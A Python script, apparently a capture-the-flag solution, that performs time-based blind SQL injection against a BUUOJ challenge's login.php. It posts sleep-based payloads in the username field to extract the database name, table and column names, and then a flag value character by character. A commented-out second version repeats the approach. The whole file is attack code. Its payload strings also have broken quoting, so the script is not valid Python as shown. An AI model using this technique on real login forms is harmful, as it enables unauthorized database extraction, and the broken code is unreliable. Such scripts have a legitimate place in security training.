import requests
import datetime


def start():
    flag = ''
    paramsPost = {'name': '', 'pass': 'shopxo'}
    url = 'http://d70f4f8d-59bc-4d3e-9ed4-0c9fbbf368bb.node3.buuoj.cn/login.php'
    l = 'qwertyuiopasdfghjklzxcvbnm-=+_,.1234567890}{'
    for i in range(1, 30):
        for j in range(32, 127):
            # payload = f'admin' or if(ascii(substr(database(),{i},1))={j},sleep(3),1)#'
            # payload = f'1' or if(ascii(substr((seLEct group_concat(table_name) from information_schema.tables where table_schema=database()),{i},1))={j},sleep(3),1)#'
            # payload = f'1' or if(ascii(substr((seLEct group_concat(column_name) from information_schema.columns where table_name='fl4g'),{i},1))={j},sleep(3),1)#'
            payload = f'1' or if(ascii(substr((seLEct flag from fl4g),{i},1))={j},sleep(3),1)#'
            paramsPost['name'] = payload
            start_time = datetime.datetime.now()
            response = session.post(url=url,
                                    data=paramsPost)
            end_time = datetime.datetime.now()
            t = (end_time - start_time).seconds
            if t >= 3:
                flag += chr(j)
                print(flag)


if __name__ == '__main__':
    session = requests.Session()
    start()

# import requests
# import time
#
# l = 'qwertyuiopasdfghjklzxcvbnm-=+_,.1234567890}{'
# url = 'http://e9ae0627-0676-455a-81af-3d466a5bf707.node3.buuoj.cn/login.php'
# # sql = '1' or if(substr(database(),%d,1)='%s',sleep(2),1)#'
# sql = '1' or if(substr((seLEct group_concat(table_name) from information_schema.tables where table_schema=database()),%d,1)='%s',sleep(2),1)#'
# flag = ''
#
# for num in range(1, 100):
#     for i in l:
#         data = {
#             'name': sql % (num, i),
#             'pass': 'asdasd'
#         }
#         # print(data)
#         t = int(time.time())
#         r = requests.post(url=url, data=data)
#         if int(time.time()) - t > 2:
#             flag += i
#             print('flag:', flag)
#             break
# print('flag:', flag)
